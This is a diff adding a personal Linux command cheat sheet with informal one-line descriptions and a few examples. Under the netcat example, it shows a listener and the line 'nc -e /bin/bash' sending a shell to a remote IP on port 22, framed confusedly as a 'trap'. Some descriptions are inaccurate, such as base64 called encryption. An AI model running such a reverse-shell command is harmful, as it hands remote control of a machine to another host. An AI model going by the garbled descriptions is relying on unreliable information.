@@ -1,0 +1,231 @@
+
+++++++++++++++++++++++++++++++++
++ Possible stuff to know about +
+++++++++++++++++++++++++++++++++
+You have to start somewhere. Why not man intro...
+
+A)
+adduser				--> Creates a user
+addgroup			--> Manages group stuff. Not the same as groupadd
+apropos	hexedit			--> Short version of the man. Assuming you have hexedit installed
+apt-cache search php		--> Gives quite some amount of output. You have: apt-cache show "php-cli" Å to show more details on the package
+apt list			--> Possible packages available to install and installed
+apt list --installed 		--> Tells what packages you have currently installed
+apt list --upgradeable		--> What can be upgraded. Still there are dependencies to be worried about
+apt list sql			--> Only exact matches
+apt list -a *sql*		--> Correct way of searching
+apt policy			--> Package manager things outputted. Adding <some-program> as argument gives different output
+arch				--> Shows us our system architechture type, for example: x86_64
+arp				--> Tool for discovering hosts through arp-tables
+arp-scan -l			--> Scan local network for hosts
+atop				--> More then top, different than htop.
+
+B)
+base64				--> Transforms a string to base64 encrypted. Non-case sensitive. See examples
+bg				--> Brings a task to background
+
+C)
+chattr				--> Change file attributes
+cksum <somefile>		--> Checksum tool that gets some checksum info. man cksum
+csplit				--> Possibly splits a file in to multiples based on a delimiter.
+curl				--> Multipourpose crop-url-tool
+curl -4 icanhazip.com		--> Same output as whatsmyip
+cut				--> Enables cutting down a portion of a file away. Get rid of a banner for example.
+
+D)
+date				--> Gives current time. A lot to modify.
+df				--> File system discs. Use more options to get a lot of info. DiscFree. -T
+dict				--> dict - suomi outputs definition of the word suomi. Try consciousness. Online dictionary.
+diff				--> Difference between 2 files
+dig				--> DNS lookup tool
+dpkg --list			--> List of installed with a description
+du -sh				--> Disc usage. See man du for more. Summarise, Human-readable
+
+E)
+expand				--> Convert tabs to spaces.
+export				--> Exporting a variable to an enviroment variable
+
+F)
+factor				--> Punch in a number and this tells of which primes it's consisted of. Very handy
+fdisk				--> Partition table manager
+fg				--> Brings a task to foreground. Used in many instances
+firewalld			--> Said to be alternative to ufw
+fmt				--> Format a textfile to an alternative format. Use: fmt somefile.txt ==> This outputs alternative formatting without changing the already existing file.
+fold				--> Wordwrapping the manual way.
+free				--> Shows current memory usage.
+fwupdmgr			--> fwupdmgr --help for more info. Utility to manage larger scale updates
+fzf				--> Fuzzy finder. Enabling handy history/file querys. Lot's of configs can be found online
+
+G)
+gawk				--> Find text in file and replace with something. Think macro.
+gcc				--> Standard compiler for C, C++ and others.
+gpg				--> Some sort of cryptographic tool
+grep -i				--> Find for an instance with incasesensitive query
+groupadd			--> Create a group
+git				--> Version control tool
+gzip				--> Compression tool
+
+H)
+head				--> Output the first part of files (or input) instead the whole thing. -n 30 gives 30 lines
+hexedit				--> Hexeditor for linux. See xxd also.
+history				--> See your command history. Useful thing to source. !123 typed on commad-line gives the entry number 123
+hostname			--> Gives system name
+hostnamectl			--> Gives info about your operating system
+htop				--> Better then top. See also: atop, top
+
+I)
+id				--> Groups info.
+install				--> Enables installing of some sort. Read the man before use.
+man intro			--> You want to learn by doing? man intro is the correct step
+iostat				--> Monitor CPU and I/O things
+
+J)
+journalctl			--> Full system journals (a lot of stuff). journalctl | grep -i failed | grep -i dbus | less
+journalctl -u ssh		--> Gives logs on your ssh server about login attempts
+jq				--> For parsing JSON to better looking intendations
+
+L)
+last				--> Shows the past logins to the system
+lastb				--> Shows last bad (failed) logins to the system
+lastlogin -u root		--> Shows last logins from root. Try running without flags. I believe this is for outside-connections only
+lftp				--> Tool for making remote connections
+ln				--> Linking tool
+locate bash			--> Shows all paths where bash is in pathname. Faster than find. Works on filenames also.
+logname				--> Current user.
+login				--> Start a session. Requires a username as param. Very good man pages that take you everywhere
+lsblk           		--> Listing storage things
+lsmod				--> Lists kernel modules
+lsof				--> Network files open: sudo lsof -i
+
+M)
+mkfifo				--> Making some pipelines tool. Don't understand.
+mkfs		            	--> Make filesystem
+mknod				--> Something I don't understand.
+mount				--> If you want to use a shared drive for example. Use umount to unmount.
+mtr				--> Said to combine traceroute and ping
+
+N)
+nc				--> Netcat. Man nc
+netdiscover			--> Find devices on a network. Uses ARP things.
+netstat				--> Networking things
+NetworkManager			--> The app that enables the networking icon on GUI on linux. man NetworkManager
+nft				--> NetworkFirewallTables. Tool like ufw or iptables
+nice				--> Prioritise jobs.
+nl				--> When printing to stdout, use linenumberings.
+nmap				--> Tool for network scanning
+nmon				--> Monitor your system tool. New info for me.
+nohup				--> Ignore hangups on messaging. Possibly relates to some tty stuff.
+
+O)
+openssl				--> Tool for creating tokens
+
+P)
+parted          		--> Something regarding partitions
+ping				--> Basic pinging tool
+ps				--> Current processes snapshot. Use with aux for better info. -H for hierarchy.
+ps -p $$			--> What process I am. When run in terminal, it should output the shell. Used in a script, tells the name of the script.
+pstree				--> Shows your processes in a tree format. First entry is your system manager
+pwgen				--> Crappy RNG, but holds simple syntax..
+
+R)
+rg				--> RipGrep. More efficient than grep, when it comes to optimization. Maybe just an alternative
+
+S)
+sar				--> System reporting tool
+scp				--> SecureCoPy. Don't know how secure. Guessing pretty secure. SSH stuff.
+screen				--> Tool to get a terminal screen. This seems useful, but a big tool.
+sed				--> StreamEditor
+select				--> TLDR, man select
+seq				--> Print sequence of numbers.
+service				--> Runs/starts/stops services. Use the flag --status-all to get "all services". See examples for more info
+set				--> Outputs settings and variables
+sftp				--> Can move files with SSH
+sort mytextfile			--> Reads one line at a time, sorts the read lines and outputs as sorted.
+ssh-keygen			--> Creates pair of keys for you.
+stat myFile			--> Prints available info on myFile including different timestams
+symlink				--> Add a new name for a file.
+sync				--> Sync data on disk with memory. Very useful when building things.
+systemctl status ssh		--> Gives the status of ssh. We can also restart, stop and many more. See the man. We can also drop out ssh from the command to see nice output also
+systemctl --type-service	--> Gives services. From now on systemctl will be referred as s
+s list-units --type=service --all	--> Same as above, but with even the failed ones included
+s list-unit-files
+
+T)
+tac				--> Same as cat, but in reverse.
+tail -f -n 40			--> Last 40 entrys of a file. Keep following actively
+tar				--> Making blocks out of things. Archiver
+tcpdump				--> Tool that Wireshark utilizes I believe. Get NIC traffic to a file.
+terminator			--> Alternative terminal. Identified as wifi-hacking-terminal
+test				--> Write tests on files on the commandline.
+timedatectl			--> Things that enable usage of time handling. man <systemd-timedated.service || timedatectl>
+tmux				--> Tool that enables some features for the terminal
+top				--> Processes tool. See also: htop, atop
+traceroute			--> Shows some routing info. Amount of hops to a point for example
+tree				--> Find . in a nice looking format.
+tsort				--> Topological sort. Can mean a lot of things.
+tty				--> Terminal that is connected to stdin. Number that follows is the terminal number. There should be no more than the amount you have open
+type -a history			--> Tells that history is an alias and is a shell builtin. Additional/all (-a)
+
+U)
+ufw				--> Ubuntu Firewall. Uncomplicated FireWall
+uname -a			--> Prints sytem information
+unexpand			--> Convert spaces to tabls.
+uniq				--> Filter for uniqueness.
+units				--> Binary to decimal convertion cheatsheet.
+unzip <file>			--> Unzips a .zip file to current location.
+
+V)
+valgrind			--> For debugging and analyzing coredumps. Step towards assembly
+vim				--> Basic editor. $cheat/vimCheatsheet/vimSyntax.txt
+vmstat				--> Virtual Memory STATistics tool
+
+W)
+watch				--> Same as kglp in kubeland.
+whatis nmap			--> Short description on what nmap is.
+whereis nmap			--> Locates nmap on your system.
+which ssh			--> Shows what is the default program that we use for ssh. Works for others aswell
+who				--> Shows logged in users
+
+X)
+xargs				--> Don't know what the difference is between this and args
+
+Y)
+yes				--> Infinite loop of printing something to stdout.
+
+Z)
+zcat myFile.gz			--> Shows the content of that gzipped file
+zip				--> Zips stuff so Microsoft understands better.
+zsh				--> Good shell for replacing bash. Easy to mod and integrate. Configs are semi-easy to read.
+
+
+
+++++++++++++
++ Examples +
+++++++++++++
+
+ls -l /etc/systemd/system /usr/lib/systemd/service | egrep .service$
+--> Searches 2 paths content for possible services. I'm not sure how the $ behaves
+
+B)
+echo -n 'hereIsASecretString' | base64	--> aGVyZUlzQVNlY3JldFN0cmluZw==	--> No trailing newline (-n), --decrypt for reversing.
+
+N)
+Setting up a trap: If I can guess the attackers IP, I could be able to get a shell to their computer
+I am listening for connections to get a reverse shell
+nc -lnvp 22 -s 123.123.123.132
+--> listen, noDNS, verbose, port, sourceIpOfMe
+
+Attacker tries to attack with:
+nc -e /bin/bash 123.123.123.132 22
+--> Tries to execute a shell in this IP address on port22
+
+S)
+service --status-all //If a service in it's definition hasn't given the status property, then ? will show when queried. Otherwise + is yes and - is no.
+
+T)
+tar cvf file-to-create.tar /path/from/where/to/create
+
+
+
+
+
